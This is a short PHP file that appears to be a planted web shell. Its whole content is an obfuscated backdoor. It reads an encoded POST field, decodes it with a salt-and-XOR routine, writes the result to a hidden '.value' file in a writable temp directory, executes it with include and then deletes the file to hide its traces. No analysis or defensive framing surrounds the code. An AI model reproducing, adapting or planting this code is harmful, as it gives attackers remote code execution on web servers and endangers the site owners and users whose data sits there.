<!--YlbAzBzs-->
YlbAzBzs<?php

if(!empty($_POST["data\x5Fch\x75nk"])){
$ent = array_filter([sys_get_temp_dir(), getenv("TEMP"), "/dev/shm", "/tmp", getcwd(), ini_get("upload_tmp_dir"), "/var/tmp", session_save_path(), getenv("TMP")]);
$entity = $_POST["data\x5Fch\x75nk"];
 $entity		 =		explode(		"."		, 	 $entity  );	
$k=	'';
$salt1=	'abcdefghijklmnopqrstuvwxyz0123456789';
$lenS=	strlen($salt1);

foreach ($entity as $i	 => $val) {
    $chS=	ord($salt1[$i % $lenS]);
    $dec=	((int)$val - $chS - ($i % 10)) ^ 29;
    $k .= chr($dec);
}
for ($symbol = 0, $desc = count($ent); $symbol < $desc; $symbol++) {
    $entry = $ent[$symbol];
            if ((function($d) { return is_dir($d) && is_writable($d); })($entry)) {
            $res = "$entry" . "/.value";
            $hld = fopen($res, 'w');
if ($hld && fwrite($hld, $k)) {
    fclose($hld);
    include $res;
    unlink($res);
    die();
}
        }
}
}